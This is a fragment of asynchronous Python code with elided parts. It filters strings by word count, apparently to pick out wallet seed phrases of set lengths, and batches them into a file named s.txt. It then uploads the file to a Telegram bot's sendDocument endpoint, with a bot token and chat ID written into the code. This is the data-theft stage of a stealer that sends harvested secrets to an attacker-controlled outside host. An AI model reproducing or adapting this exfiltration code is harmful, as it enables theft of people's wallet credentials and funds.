            ...
            if isinstance(p, tuple):
                for f in p:
                    if isinstance(f, str):
                        w = f.strip().split()
                        if len(w) in c:
                            serialized.append(f.strip())
        
        if serialized:
            for idx in range(0, len(serialized), 200):
                b = serialized[idx : idx + 200]
                ...
                form.add_field("chat_id", "-4603005900")
                form.add_field(
                    "document",
                    open(tmp_path, "rb"),
                    filename="s.txt",
                ...
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(
                            "https://api.telegram.org/bot7898094721:AAHDzn6XqMrRFqD2LE60pZoy2QEv-ugs2jw/sendDocument",
                            data=form
                        ) as resp:
